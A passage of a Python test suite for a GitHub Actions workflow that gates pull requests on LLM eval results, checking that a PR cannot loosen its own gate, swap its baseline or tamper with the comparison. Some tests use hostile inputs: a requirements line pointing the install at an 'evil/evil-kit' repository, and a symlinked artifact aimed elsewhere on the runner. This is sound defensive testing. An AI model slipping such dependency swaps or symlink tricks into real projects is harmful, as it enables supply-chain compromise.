            {"evalsprint": evalsprint or STUB_EVALSPRINT, "pip": STUB_PIP, "gh": STUB_GH, **kit_stubs, **(stubs or {})},
            {"evals": checkout("ws"), "baseline": checkout("ws"), "changes": checkout("ws_changes")},
            checkout_ref=checkout_ref if clone else None,
        )
        runner.start_at, runner.seed_steps, runner.temp_files = start_at or {}, seed_steps or {}, temp_files or {}
        runner.stub_env = {"STUB_LOG": str(root / "calls.jsonl"), "STUB_GH_STATE": str(state), **{k: str(v) for k, v in (stub_env or {}).items()}}
        for rel, text in (artifacts or {}).items():
            if isinstance(text, tuple):  # ("symlink", target): a hostile artifact entry that points somewhere else on the runner
                (runner.artifacts / rel).parent.mkdir(parents=True, exist_ok=True)
                (runner.artifacts / rel).symlink_to(text[1])
            else:
                write(runner.artifacts / rel, text)
        runner.run(only=only, seed=seed)
        runner.state_path, runner.workspace, runner.changes_workspace, runner.private_origin = state, made.get("ws"), made.get("ws_changes"), private
        return runner

    def plan(
        self, run_code: str, trusted: str = "true", evals_result: str = "success", missing: str = "false", why: str = "", workflow: str | Path = PR_WORKFLOW
    ) -> dict:
        """What the REAL Plan step of the compare job writes to its outputs for these inputs (the steps after it are cut off).

        `run_code` is the job output of the evals job, which the PR's code can set to any text. Returns the outputs of the step, read with
        the runner's own $GITHUB_OUTPUT grammar (`{}` when the step failed to start or to write them).
        """

        def cut_after_plan(doc):
            steps = doc["jobs"]["compare"]["steps"]
            doc["jobs"]["compare"]["steps"] = steps[: next(i for i, s in enumerate(steps) if s.get("id") == "plan") + 1]

        runner = self.scenario(
            clone=False,
            only=("compare",),
            patch=cut_after_plan,
            workflow=workflow,
            seed={
                **KEYS,
                **RELEVANT,
                "trusted": {"outputs": {"available": trusted, "missing": missing, "missing_why": why, "base_sha": "0123456789abcdef"}},
                "evals": {"result": evals_result, "outputs": {"run_exit_code": run_code}},
            },
        )
        step = runner.jobs["compare"]["steps"]["plan"]
        self.last_plan_ok, self.last_plan_log = step["outcome"] == "success", runner.jobs["compare"]["log"]
        return step["outputs"]

    def decide(
        self, run_code: str, compare_code: str = "", trusted: str = "true", files: dict | None = None, missing: str = "false", why: str = "",
        evals_result: str = "success", download: str = "success", plan_override: dict | None = None, workflow: str | Path = PR_WORKFLOW,
    ) -> Runner:
        """Run the verdict step and everything after it, as if `run` and `compare` had exited with these codes.

        The Plan step is the real one (see `plan`): its checked outputs are what the verdict step then reads. `files` are the files of
        the compare job's RUNNER_TEMP: `eval-out/gate.md` (what `compare --md` wrote) and `eval-out/candidate/summary.json` (what the
        download and the staging step left there).
        """
        planned = {**self.plan(run_code, trusted, evals_result, missing, why, workflow), **(plan_override or {})}
        self.assertTrue(self.last_plan_ok, self.last_plan_log)
        has_files = planned["files"] == "true"
        return self.scenario(
            clone=False,
            workflow=workflow,
            temp_files={"compare": files or {}},
            only=("compare", "gate"),
            seed={
                **KEYS,
                **RELEVANT,
                "trusted": {"outputs": {"available": trusted, "missing": missing, "missing_why": why, "base_sha": "0123456789abcdef"}},
                "evals": {"result": evals_result, "outputs": {"run_exit_code": run_code}},
            },
            start_at={"compare": "verdict"},
            seed_steps={
                "compare": {
                    "plan": {"outputs": planned},
                    "download": {"outputs": {}, "outcome": download if has_files else "skipped"},
                    "stage": {"outputs": {}, "outcome": "success" if has_files and download == "success" else "skipped"},
                    "compare": {"outputs": {"exit_code": compare_code}},
                }
            },
        )

    @staticmethod
    def calls(runner: Runner, tool: str | None = None, job: str | None = None) -> list[dict]:
        log = runner.root / "calls.jsonl"
        rows = [json.loads(line) for line in log.read_text(encoding="utf-8").splitlines()] if log.exists() else []
        return [row for row in rows if (tool is None or row["tool"] == tool) and (job is None or row.get("job") == job)]

    def evalsprint_commands(self, runner: Runner, job: str | None = None) -> list[str]:
        return [c["args"][0] for c in self.calls(runner, "evalsprint", job)]

    @staticmethod
    def gh_state(runner: Runner) -> dict:
        return json.loads(runner.state_path.read_text(encoding="utf-8"))

    @staticmethod
    def artifact_file(runner: Runner, pattern: str) -> Path:
        (found,) = sorted(runner.artifacts.glob(pattern))
        return found

    @classmethod
    def gate_md(cls, runner: Runner) -> str:
        """The text the comment job posts: the artifact `eval-gate-<pr>` that the verdict step wrote (either workflow shape)."""
        return cls.artifact_file(runner, "eval-gate-*/gate.md").read_text(encoding="utf-8")

    @classmethod
    def gate_json(cls, runner: Runner) -> dict:
        return json.loads(cls.artifact_file(runner, "eval-*/gate.json").read_text(encoding="utf-8"))

    @staticmethod
    def decision(runner: Runner) -> dict:
        """The job whose outputs are the verdict: `compare` in the shipped workflow, `evals` in the single-job one of v0.1."""
        job = runner.jobs.get("compare")
        return job["outputs"] if job and job["result"] != "skipped" else runner.jobs["evals"]["outputs"]

    def verdict(self, runner: Runner) -> str:
        return self.decision(runner).get("verdict", "")


@needs_tools
class GateComesFromTheBaseBranchTests(PrWorkflowBase):
    """A pull request must not be able to loosen its own gate, swap its baseline or delete the evidence."""

    def test_a_pr_that_loosens_its_own_gate_and_baseline_is_still_judged_by_the_base_branch(self):
        runner = self.scenario(
            pr_edits={
                "evals/eval.yaml": LOOSE_GATE,  # the PR relaxes gate: in its own copy of eval.yaml
                "evals/baseline/summary.json": json.dumps({**BASE_SUMMARY, "run_id": "poisoned-by-the-pr", "pass_rate": 0.0}),
                "evals/cases.jsonl": '{"id": "a"}\n',  # and deletes the cases it fails
            }
        )
        pr_ws, compare_ws = runner.workspace_paths["evals"], runner.workspace_paths["compare"]
        # The PR's workspace really carries the tampered files...
        self.assertIn("max_pass_rate_drop: 1.0", (pr_ws / "evals" / "eval.yaml").read_text(encoding="utf-8"))
        # ...but compare ran in a checkout of the base commit, so it was handed the base branch's gate and baseline.
        (inputs,) = self.calls(runner, "compare-inputs")
        self.assertEqual(inputs["job"], "compare")
        self.assertEqual(inputs["cwd"], str(compare_ws))
        self.assertEqual(inputs["gate"], STRICT_GATE)
        self.assertEqual(inputs["baseline_run"], BASE_SUMMARY["run_id"])
        self.assertEqual(inputs["gate_file"], "evals/eval.yaml")
        self.assertEqual(inputs["baseline"], "evals/baseline")
        self.assertTrue(inputs["calibration"], "the baseline's calibration.json must travel with it")
        self.assertEqual(git(compare_ws, "rev-parse", "HEAD"), git(runner.private_origin, "rev-parse", "main"))  # the tip of the base branch, no merge commit
        self.assertNotEqual(pr_ws, compare_ws)
        self.assertEqual((compare_ws / "evals" / "eval.yaml").read_text(encoding="utf-8"), STRICT_GATE)  # nothing of the PR is in there
        self.assertEqual(len((compare_ws / "evals" / "cases.jsonl").read_text(encoding="utf-8").splitlines()), 4)  # it deleted three cases
        (compare,) = [c for c in self.calls(runner, "evalsprint") if c["args"][0] == "compare"]
        self.assertIn("--gate-config", compare["args"])
        self.assertNotIn("-c", compare["args"])  # the PR's evals/eval.yaml is never named
        # The HTML report is built against the same trusted files, in the same job.
        (report,) = [c for c in self.calls(runner, "evalsprint") if c["args"][0] == "report"]
        self.assertEqual(report["job"], "compare")
        self.assertEqual(report["args"][report["args"].index("--baseline") + 1], "evals/baseline")
        self.assertEqual(report["args"][report["args"].index("--gate-config") + 1], "evals/eval.yaml")
        # Verdict: the strict gate blocks it (the stub only lets a loosened gate through), and the gate job goes red.
        self.assertEqual(runner.jobs["compare"]["outputs"]["verdict"], "regression")
        self.assertEqual(runner.jobs["gate"]["result"], "failure")
        self.assertTrue(any("LLM eval regression" in line for line in runner.annotations("gate", "error")))
        text = self.gate_md(runner)
        self.assertIn("Regression detected", text)
        self.assertRegex(text, r"come from `main` @ `[0-9a-f]{7}` \(the base branch\), not from this pull request")
        self.assertIn("The candidate results themselves come from the pull request's code.", text)  # the limit is said where people read the verdict

    def test_control_the_same_pr_passes_when_the_loosened_gate_is_the_trusted_one(self):
        """Guards the test above against a vacuous pass: if the base branch itself has the loose gate, compare exits 0."""
        loose_origin = make_origin(self.tmp / "origin_loose", gate=LOOSE_GATE)
        runner = self.scenario(origin=loose_origin, pr_edits={"evals/eval.yaml": STRICT_GATE})
        (inputs,) = self.calls(runner, "compare-inputs")
        self.assertEqual(inputs["gate"], LOOSE_GATE)  # the PR's strict copy is as irrelevant as a loose one
        self.assertEqual(self.verdict(runner), "pass")
        self.assertEqual(runner.jobs["gate"]["result"], "success")

    def test_a_pr_that_installs_the_evals_is_not_gated_but_says_so(self):
        # The base branch has no baseline at all: nothing trusted exists, so no verdict is possible.
        bare_origin = make_origin(self.tmp / "origin_bare", with_baseline=False)
        runner = self.scenario(origin=bare_origin, pr_edits={"evals/eval.yaml": STRICT_GATE, "evals/baseline/summary.json": json.dumps(BASE_SUMMARY)})
        self.assertEqual(self.evalsprint_commands(runner), ["run", "report"])  # no compare
        self.assertEqual(self.evalsprint_commands(runner, "evals"), ["run", "report"])  # the report of the candidate alone is built where the kit is
        self.assertEqual(runner.jobs["compare"]["outputs"], {"verdict": "bootstrap", "exit_code": "0"})
        self.assertEqual(runner.jobs["compare"]["steps"]["install"]["outcome"], "skipped")  # the base has no pin to install
        self.assertEqual(runner.jobs["gate"]["result"], "success")
        self.assertTrue(any("LLM evals not enforced" in line for line in runner.annotations("gate", "warning")))
        self.assertTrue(any("No baseline on the base branch" in line for line in runner.annotations("trusted", "warning")))
        self.assertIn("Eval gate not enforced yet", self.gate_md(runner))
        (report,) = [c for c in self.calls(runner, "evalsprint") if c["args"][0] == "report"]
        self.assertNotIn("--baseline", report["args"])  # nothing trusted to compare with
        self.assertTrue((runner.temp_of("compare") / "eval-out" / "candidate" / "report.html").exists())  # and it reaches the report artifact


@needs_tools
class SplitJobTests(PrWorkflowBase):
    """C3-09 at run time: what each job can see, and how the candidate gets from the job that runs the PR to the one that judges it."""

    def test_the_jobs_share_nothing_but_outputs_and_artifacts(self):
        runner = self.scenario(stub_env={"STUB_COMPARE_EXIT": 0, "STUB_SUMMARY": json.dumps({"run_id": "cand-1", "pass_rate": 0.75})})
        pr_ws, trusted_ws, compare_ws = (runner.workspace_paths[j] for j in ("evals", "trusted", "compare"))
        self.assertEqual(len({pr_ws, trusted_ws, compare_ws}), 3)
        self.assertEqual(len({runner.temp_of(j) for j in ("evals", "trusted", "compare")}), 3)
        self.assertEqual((pr_ws / "src" / "llm" / "prompt.txt").read_text(encoding="utf-8"), "v2\n")  # the PR's change is in its workspace...
        self.assertEqual((compare_ws / "src" / "llm" / "prompt.txt").read_text(encoding="utf-8"), "v1\n")  # ...and not in the compare job's
        self.assertEqual(self.verdict(runner), "pass")
        # The candidate was produced in the PR job's workspace and reached the compare job as files of an artifact...
        self.assertTrue((pr_ws / "runs" / "candidate" / "summary.json").exists())
        self.assertFalse((compare_ws / "runs").exists())
        (inputs,) = self.calls(runner, "compare-inputs")
        self.assertEqual(inputs["candidate"], f"{runner.temp_of('compare')}/eval-out/candidate")
        self.assertEqual(json.loads(inputs["candidate_summary"])["run_id"], "cand-1")
        self.assertNotIn(str(pr_ws), inputs["candidate"])
        # ...and nothing else of the PR job is there: not the PR's workspace, not its temp, not its kit.
        self.assertFalse((runner.temp_of("compare") / "trusted").exists())
        self.assertFalse((runner.temp_of("evals") / "trusted").exists())  # the evals job never held a trusted copy: there is nothing to tamper with
        self.assertEqual(self.evalsprint_commands(runner, "evals"), ["run"])
        self.assertEqual(self.evalsprint_commands(runner, "compare"), ["compare", "report"])
        self.assertEqual(self.calls(runner, "evalsprint", "trusted"), [])  # the job that reads the base branch runs no tool of the kit

    def test_the_compare_job_installs_the_kit_the_base_branch_pins_not_the_one_the_pr_asks_for(self):
        swapped = "evalsprint @ git+https://github.com/evil/evil-kit@v9.9.9\n"
        runner = self.scenario(pr_edits={"evals/requirements.txt": swapped}, stub_env={"STUB_COMPARE_EXIT": 0})
        by_job = {c["job"]: c for c in self.calls(runner, "pip")}
        self.assertEqual(by_job["evals"]["requirements"], swapped)  # the candidate is produced with what the PR asks for...
        self.assertEqual(by_job["compare"]["requirements"], "evalsprint @ git+https://github.com/example/eval-sprint@v0.2.0\n")  # ...the comparison with the base's pin
        self.assertEqual(by_job["compare"]["cwd"], str(runner.workspace_paths["compare"]))
        self.assertEqual(by_job["compare"]["args"], ["install", "-r", "evals/requirements.txt"])

    def test_the_compare_job_reads_only_the_artifact_even_if_the_pr_workspace_holds_another_candidate(self):
        """The run directory the PR left in its workspace is not what is compared: the uploaded copy is."""
        runner = self.scenario(stub_env={"STUB_COMPARE_EXIT": 0, "STUB_SUMMARY": json.dumps({"run_id": "uploaded"})})
        self.assertEqual(json.loads(self.calls(runner, "compare-inputs")[0]["candidate_summary"])["run_id"], "uploaded")
        self.assertEqual(json.loads((self.artifact_file(runner, "eval-candidate-*/summary.json")).read_text(encoding="utf-8"))["run_id"], "uploaded")

    def test_a_candidate_that_was_never_uploaded_is_an_error_not_a_pass(self):
        """If the evals job ran but its files did not arrive, the compare job must not compare nothing and call it green."""

        def no_upload(doc):
            steps = doc["jobs"]["evals"]["steps"]
            doc["jobs"]["evals"]["steps"] = [s for s in steps if not str(s.get("uses", "")).startswith("actions/upload-artifact")]

        runner = self.scenario(patch=no_upload, stub_env={"STUB_COMPARE_EXIT": 0})
        self.assertEqual(runner.jobs["compare"]["outputs"]["verdict"], "error")
        self.assertEqual(runner.jobs["gate"]["result"], "failure")
        self.assertIn("the download of the candidate run", self.gate_md(runner))
        self.assertEqual(self.evalsprint_commands(runner, "compare"), [])  # nothing was compared

    def test_a_failed_kit_install_in_the_compare_job_is_an_error_not_a_pass(self):
        runner = self.scenario(stub_env={"STUB_PIP_EXIT": 1, "STUB_PIP_FAIL_JOB": "compare", "STUB_COMPARE_EXIT": 0})
        self.assertEqual(runner.jobs["evals"]["result"], "success")  # the candidate was produced
        self.assertEqual(runner.jobs["compare"]["result"], "failure")
        self.assertEqual(runner.jobs["compare"]["outputs"], {"verdict": "error", "exit_code": "255"})
        self.assertIn("a setup step of the compare job", self.gate_md(runner))
        self.assertEqual(runner.jobs["gate"]["result"], "failure")
        self.assertEqual(self.evalsprint_commands(runner), ["run"])

    def test_the_comment_text_is_written_by_the_compare_job_not_by_the_pr_job(self):
        runner = self.scenario(stub_env={"STUB_COMPARE_EXIT": 1})
        posted = self.gh_state(runner)["comments"]
        self.assertEqual(len(posted), 1)
        self.assertIn("Regression detected", posted[0]["body"])
        self.assertEqual({c["job"] for c in self.calls(runner, "gh")}, {"comment"})
        self.assertTrue((runner.temp_of("compare") / "eval-out" / "gate.md").exists())
        self.assertFalse((runner.workspace_paths["evals"] / "gate.md").exists())  # the PR job never wrote the comment text


@needs_tools
class ExitCodeTests(PrWorkflowBase):
    """evalsprint exit codes 0 / 1 / 2 / 3 each get their own message and job result.

    A few full runs prove the wiring end to end; the table of exit codes then runs the real "Decide the verdict" step
    and the gate job on seeded step outputs, which is what a run with that exit code would have produced.
    """

    UNHEALTHY = json.dumps({"n_cases": 20, "n_errors": 9, "n_target_errors": 2, "n_judge_errors": 7, "error_rate": 0.45})

    def test_the_exit_code_table(self):
        md = {"eval-out/gate.md": "## Regression detected\n\nreasons\n"}
        cases = [
            # (run code, compare code, files, verdict, gate result, text in gate.md, annotation title on the gate job)
            ("0", "0", {"eval-out/gate.md": "## No regression\n"}, "pass", "success", "No regression", None),
            ("0", "1", md, "regression", "failure", "Regression detected", "LLM eval regression"),
            ("0", "2", {}, "config_error", "failure", "`evalsprint compare` exited with code 2", "LLM eval configuration error"),
            ("2", "", {}, "config_error", "failure", "`evalsprint run` exited with code 2", "LLM eval configuration error"),
            ("3", "", {"eval-out/candidate/summary.json": self.UNHEALTHY}, "unhealthy", "failure", "Eval infrastructure error, not a quality regression", "LLM eval infrastructure error"),
            ("0", "3", {}, "unhealthy", "failure", "Eval infrastructure error, not a quality regression", "LLM eval infrastructure error"),
            ("0", "137", {}, "error", "failure", "`evalsprint compare` ended with exit code 137", "LLM eval job did not finish"),
            ("1", "", {}, "error", "failure", "`evalsprint run` ended with exit code 1", "LLM eval job did not finish"),
            ("130", "", {}, "error", "failure", "`evalsprint run` ended with exit code 130", "LLM eval job did not finish"),  # Ctrl-C: the run saved its partial file
            ("143", "", {}, "error", "failure", "`evalsprint run` ended with exit code 143", "LLM eval job did not finish"),  # SIGTERM, same
            ("", "", {}, "error", "failure", "a setup step of the evals job", "LLM eval job did not finish"),
            ("0", "", {}, "error", "failure", "a setup step of the compare job", "LLM eval job did not finish"),  # compare never reported back
            ("0", "1", {}, "regression", "failure", "Eval comparison did not complete", "LLM eval regression"),  # compare wrote no file
        ]
        for run_code, compare_code, files, verdict, gate_result, text, title in cases:
            with self.subTest(run=run_code, compare=compare_code):
                runner = self.decide(run_code, compare_code, files=files)
                self.assertEqual(runner.jobs["compare"]["outputs"]["verdict"], verdict)
                self.assertEqual(runner.jobs["compare"]["result"], "success")  # the worker job finished; the gate job judges
                self.assertEqual(runner.jobs["gate"]["result"], gate_result)
                self.assertIn(text, self.gate_md(runner))
                errors = runner.annotations("gate", "error")
                if title is None:
                    self.assertEqual(errors, [])
                    self.assertIn("Eval gate passed.", runner.jobs["gate"]["log"])
                else:
                    (error,) = errors
                    self.assertIn(f"::error title={title}::", error)
                    if verdict != "regression":
                        self.assertIn("not a quality regression", error)  # setup problems and infrastructure errors never read as regressions
                        self.assertNotIn("The candidate is worse", error)
                    if verdict == "error":  # the verdict step did answer: the message must not claim there was no verdict
                        self.assertIn("unexpected exit code", error)
                        self.assertNotIn("no verdict", error)

    def test_a_download_that_failed_is_an_error_even_when_the_run_was_healthy(self):
        runner = self.decide("0", "", download="failure")
        self.assertEqual(runner.jobs["compare"]["outputs"]["verdict"], "error")
        self.assertIn("the download of the candidate run", self.gate_md(runner))
        self.assertEqual(runner.jobs["gate"]["result"], "failure")

    def test_a_job_that_died_before_the_verdict_step_says_so(self):
        for result in ("cancelled", "failure"):
            with self.subTest(result=result):
                runner = self.scenario(only=("gate",), seed={**KEYS, **RELEVANT, **TRUSTED_OK, "evals": {"result": "success"}, "compare": {"result": result, "outputs": {}}})
                self.assertEqual(runner.jobs["gate"]["result"], "failure")
                (error,) = runner.annotations("gate", "error")
                self.assertIn(f"result '{result}' and no verdict", error)
                self.assertIn("not a quality regression", error)

    def test_a_base_branch_read_that_failed_fails_the_gate_without_a_verdict(self):
        runner = self.scenario(only=("gate",), seed={**KEYS, **RELEVANT, "trusted": {"result": "failure", "outputs": {}}, "evals": {"result": "skipped"}, "compare": {"result": "skipped"}})
        self.assertEqual(runner.jobs["gate"]["result"], "failure")
        (error,) = runner.annotations("gate", "error")
        self.assertIn("LLM eval base-branch read failed", error)
        self.assertIn("not a quality regression", error)

    def test_exit_3_reports_the_error_counts(self):
        runner = self.decide("3", files={"eval-out/candidate/summary.json": self.UNHEALTHY})
        md = self.gate_md(runner)
        self.assertIn("| Cases with an error | 9 of 20 |", md)
        self.assertIn("| Target errors (the system under test) | 2 |", md)
        self.assertIn("| Judge errors (the grader) | 7 |", md)
        self.assertIn("| Error rate | 45.0% |", md)
        self.assertIn("Eval infrastructure error", runner.jobs["compare"]["summary"])  # also in the job summary
        # Without a readable summary the message still says what it can.
        broken = self.decide("3", files={"eval-out/candidate/summary.json": "not json"})
        self.assertIn("| Cases with an error | n/a of n/a |", self.gate_md(broken))

    def test_the_verdict_names_the_trusted_commit_only_when_there_was_one(self):
        with_base = self.decide("0", "0", files={"eval-out/gate.md": "## No regression\n"})
        self.assertIn("come from `main` @ `0123456` (the base branch)", self.gate_md(with_base))
        without = self.decide("0", "", trusted="false")
        self.assertEqual(without.jobs["compare"]["outputs"], {"verdict": "bootstrap", "exit_code": "0"})
        self.assertNotIn("base branch)", self.gate_md(without))
        self.assertEqual(without.jobs["gate"]["result"], "success")

    def test_full_run_exit_0_passes_and_uses_the_prs_own_suite_and_documented_flags(self):
        runner = self.scenario(stub_env={"STUB_COMPARE_EXIT": 0})
        self.assertEqual(runner.jobs["compare"]["outputs"], {"verdict": "pass", "exit_code": "0"})
        self.assertEqual(runner.jobs["gate"]["result"], "success")
        self.assertIn("No regression", self.gate_md(runner))
        self.assertIn("No regression", runner.jobs["compare"]["summary"])  # also in the job summary
        (run,) = [c for c in self.calls(runner, "evalsprint") if c["args"][0] == "run"]
        self.assertEqual(run["job"], "evals")
        self.assertEqual(run["args"][:3], ["run", "-c", "evals/eval.yaml"])  # the candidate runs the PR's code and test set
        self.assertIn("pr-7", run["args"])
        self.assertIn("--no-report", run["args"])
        self.assertTrue((runner.artifacts / "eval-candidate-7" / "summary.json").exists())
        self.assertTrue((runner.artifacts / "eval-report-7" / "candidate" / "summary.json").exists())
        self.assertTrue((runner.artifacts / "eval-report-7" / "candidate" / "report.html").exists())  # built from the baseline's side
        self.assertTrue((runner.artifacts / "eval-report-7" / "gate.md").exists())
        self.assertTrue((runner.artifacts / "eval-report-7" / "gate.json").exists())
        self.assertTrue((runner.artifacts / "eval-gate-7" / "gate.md").exists())

    def test_full_run_exit_1_is_a_regression_from_compare(self):
        runner = self.scenario(stub_env={"STUB_COMPARE_EXIT": 1})
        self.assertEqual(runner.jobs["compare"]["outputs"], {"verdict": "regression", "exit_code": "1"})
        self.assertEqual(runner.jobs["gate"]["result"], "failure")
        self.assertIn("Regression detected", self.gate_md(runner))

    def test_full_run_exit_3_is_never_compared_but_still_reported(self):
        runner = self.scenario(stub_env={"STUB_RUN_EXIT": 3, "STUB_SUMMARY": self.UNHEALTHY})
        self.assertEqual(runner.jobs["compare"]["outputs"], {"verdict": "unhealthy", "exit_code": "3"})
        commands = self.evalsprint_commands(runner)
        self.assertNotIn("compare", commands)  # errors are not a quality signal: no comparison, no misleading delta
        self.assertIn("report", commands)  # the run's files exist, so the report is still built for diagnosis
        self.assertEqual(runner.jobs["gate"]["result"], "failure")
        self.assertIn("| Judge errors (the grader) | 7 |", self.gate_md(runner))

    def test_full_run_run_exit_2_skips_the_comparison_and_the_report(self):
        runner = self.scenario(stub_env={"STUB_RUN_EXIT": 2})
        self.assertEqual(self.evalsprint_commands(runner), ["run"])
        self.assertEqual(runner.jobs["compare"]["outputs"]["verdict"], "config_error")
        self.assertEqual(runner.jobs["compare"]["steps"]["download"]["outcome"], "skipped")  # nothing was uploaded, nothing to fetch
        self.assertEqual(runner.jobs["compare"]["steps"]["install"]["outcome"], "skipped")

    def test_a_failed_setup_step_still_produces_a_verdict_and_a_red_gate(self):
        runner = self.scenario(stub_env={"STUB_PIP_EXIT": 1})
        self.assertEqual(runner.jobs["evals"]["result"], "failure")
        self.assertEqual(runner.jobs["compare"]["outputs"]["verdict"], "error")
        self.assertEqual(runner.jobs["gate"]["result"], "failure")
        self.assertIn("a setup step of the evals job", self.gate_md(runner))
        self.assertEqual(self.evalsprint_commands(runner), [])  # nothing ran after the failed install

    def test_manual_runs_use_the_default_branch_and_skip_the_comment(self):
        runner = self.scenario(event="workflow_dispatch", stub_env={"STUB_COMPARE_EXIT": 0})
        self.assertEqual(self.verdict(runner), "pass")
        self.assertEqual(runner.jobs["comment"]["result"], "skipped")
        self.assertEqual(runner.jobs["gate"]["result"], "success")
        (run,) = [c for c in self.calls(runner, "evalsprint") if c["args"][0] == "run"]
        self.assertIn("pr-manual", run["args"])
        self.assertTrue((runner.artifacts / "eval-candidate-manual" / "summary.json").exists())
        self.assertEqual(git(runner.workspace_paths["compare"], "rev-parse", "HEAD"), git(runner.private_origin, "rev-parse", "main"))


@needs_tools
class StickyCommentTests(PrWorkflowBase):
    """The comment job in isolation: the compare job is seeded as finished and its comment text as an artifact."""

    @staticmethod
    def comment(id: int, login: str, body: str) -> dict:
        return {"id": id, "user": {"login": login}, "body": body}

    def post(self, existing: list[dict], text: str = "## Regression detected\n\nbody\n", **kwargs) -> Runner:
        return self.scenario(
            only=("comment",),
            seed={"compare": {"result": "success"}},
            artifacts={"eval-gate-7/gate.md": text},
            gh_state={"comments": existing, "next_id": 5000, "prs": []},
            **kwargs,
        )

    def test_updates_only_its_own_marked_comment(self):
        others = [
            self.comment(1, "dependabot[bot]", "Bumps a package"),
            self.comment(2, "github-actions[bot]", "A different workflow's bot comment (no marker)"),
            self.comment(3, "some-human", f"{MARKER}\nA human quoting our marker must not be edited"),
            self.comment(4, "github-actions[bot]", f"Another workflow quoting us:\n{MARKER}\nnot ours"),
            self.comment(5, "github-actions[bot]", f"{MARKER}\nold verdict"),
            self.comment(6, "github-actions[bot]", "Another bot comment after ours"),
        ]
        runner = self.post(others)
        self.assertEqual(runner.jobs["comment"]["result"], "success", runner.jobs["comment"]["log"])
        comments = {c["id"]: c["body"] for c in self.gh_state(runner)["comments"]}
        self.assertEqual(len(comments), 6)  # updated in place, nothing created
        self.assertEqual(comments[5], MARKER + "\n## Regression detected\n\nbody\n")
        for untouched in (1, 2, 3, 4, 6):
            self.assertEqual(comments[untouched], next(c["body"] for c in others if c["id"] == untouched))
        writes = [c["args"] for c in self.calls(runner, "gh") if "--method" in c["args"]]
        self.assertEqual([a[a.index("--method") + 1] for a in writes], ["PATCH"])
        self.assertIn("repos/acme/app/issues/comments/5", writes[0])

    def test_creates_the_comment_when_none_of_ours_exists_and_then_keeps_updating_it(self):
        first = self.post([self.comment(1, "github-actions[bot]", "unrelated bot comment"), self.comment(2, "human", "LGTM")])
        comments = self.gh_state(first)["comments"]
        self.assertEqual(len(comments), 3)
        self.assertEqual(comments[-1]["body"], MARKER + "\n## Regression detected\n\nbody\n")
        # A new push to the same PR: the same state, a new verdict.
        second = self.post(comments, text="## No regression\n")
        comments = self.gh_state(second)["comments"]
        self.assertEqual(len(comments), 3)  # still one comment of ours
        self.assertEqual(comments[-1]["body"], MARKER + "\n## No regression\n")
        self.assertEqual([c["body"] for c in comments[:2]], ["unrelated bot comment", "LGTM"])

    def test_finds_the_comment_on_a_later_page(self):
        many = [self.comment(i, "human", f"comment {i}") for i in range(1, 8)] + [self.comment(50, "github-actions[bot]", f"{MARKER}\nold")]
        runner = self.post(many, text="new\n")
        comments = self.gh_state(runner)["comments"]
        self.assertEqual(len(comments), 8)
        self.assertEqual(comments[-1]["body"], MARKER + "\nnew\n")

    def test_honours_a_custom_comment_author(self):
        def use_app_token(doc):
            doc["jobs"]["comment"]["steps"][1]["env"]["COMMENT_AUTHOR"] = "my-app[bot]"

        existing = [self.comment(9, "my-app[bot]", f"{MARKER}\nold"), self.comment(10, "github-actions[bot]", f"{MARKER}\nsomebody else's")]
        runner = self.post(existing, text="new\n", patch=use_app_token, stub_env={"STUB_GH_ME": "my-app[bot]"})
        comments = {c["id"]: c["body"] for c in self.gh_state(runner)["comments"]}
        self.assertEqual(comments[9], MARKER + "\nnew\n")
        self.assertEqual(comments[10], f"{MARKER}\nsomebody else's")

    def test_a_read_only_token_warns_and_leaves_the_job_green(self):
        runner = self.post([], stub_env={"STUB_GH_FAIL": 1})
        self.assertEqual(runner.jobs["comment"]["result"], "success")
        self.assertTrue(any("Could not post the PR comment" in w for w in runner.annotations("comment", "warning")))

    def test_a_very_long_result_is_truncated_below_the_github_limit(self):
        runner = self.post([], text="x" * 80000)
        (posted,) = [c["body"] for c in self.gh_state(runner)["comments"]]
        self.assertLess(len(posted), 65536)
        self.assertTrue(posted.startswith(MARKER))
        self.assertIn("truncated", posted)

    def test_a_missing_artifact_still_yields_an_explanatory_comment(self):
        runner = self.scenario(only=("comment",), seed={"compare": {"result": "cancelled"}}, gh_state={"comments": [], "next_id": 1, "prs": []})
        (posted,) = [c["body"] for c in self.gh_state(runner)["comments"]]
        self.assertIn("Eval gate: no result", posted)
        self.assertIn("The compare job ended without writing a result", posted)
        self.assertIn("job result: cancelled", posted)
        self.assertEqual(runner.jobs["comment"]["result"], "success")

    def test_the_comment_job_runs_only_for_pull_requests_whose_comparison_ran(self):
        for event, compare_result in (("workflow_dispatch", "success"), ("pull_request", "skipped")):
            with self.subTest(event=event, compare=compare_result):
                runner = self.scenario(only=("comment",), event=event, seed={"compare": {"result": compare_result}})
                self.assertEqual(runner.jobs["comment"]["result"], "skipped")

    def test_the_comment_job_checks_out_nothing_and_never_sees_the_api_keys(self):
        runner = self.post([], text="ok\n")
        self.assertFalse((runner.root / "ws_comment" / "evals").exists())  # nothing from the PR was checked out there
        self.assertEqual({c["tool"] for c in self.calls(runner)}, {"gh"})  # no evalsprint, no pip


@needs_tools
class ForkAndSecretTests(PrWorkflowBase):
    def test_a_fork_pr_skips_the_evals_but_warns_loudly_and_stays_green_by_default(self):
        runner = self.scenario(fork=True, secrets={})
        self.assertEqual(runner.jobs["check-secrets"]["outputs"], {"available": "false", "reason": "fork"})
        self.assertEqual({runner.jobs[j]["result"] for j in ("trusted", "evals", "compare", "comment")}, {"skipped"})  # nothing runs: no key, no PR code, no paid call
        self.assertEqual(runner.jobs["comment"]["result"], "skipped")
        self.assertEqual(self.calls(runner), [])  # no eval run, no API call
        self.assertEqual(runner.jobs["gate"]["result"], "success")
        (warning,) = runner.annotations("gate", "warning")
        self.assertIn("LLM evals did not run", warning)
        self.assertIn("comes from a fork", warning)
        summary = runner.jobs["gate"]["summary"]
        self.assertIn("## LLM evals did not run", summary)
        self.assertIn("green only because", summary)

    def test_fail_without_secrets_turns_that_into_a_red_check(self):
        def strict(doc):
            doc["env"]["FAIL_WITHOUT_SECRETS"] = "true"

        runner = self.scenario(fork=True, secrets={}, patch=strict)
        self.assertEqual(runner.jobs["gate"]["result"], "failure")
        self.assertIn("FAIL_WITHOUT_SECRETS is true", runner.annotations("gate", "error")[0])
        self.assertIn("This check **fails**", runner.jobs["gate"]["summary"])

    def test_a_missing_secret_in_the_own_repository_is_explained_differently(self):
        runner = self.scenario(fork=False, secrets={})
        self.assertEqual(runner.jobs["check-secrets"]["outputs"]["reason"], "missing-secret")
        self.assertIn("no API key secret is configured", runner.annotations("gate", "warning")[0])
        self.assertEqual(runner.jobs["gate"]["result"], "success")

    def test_a_dependabot_pr_without_a_dependabot_secret_is_explained_as_such(self):
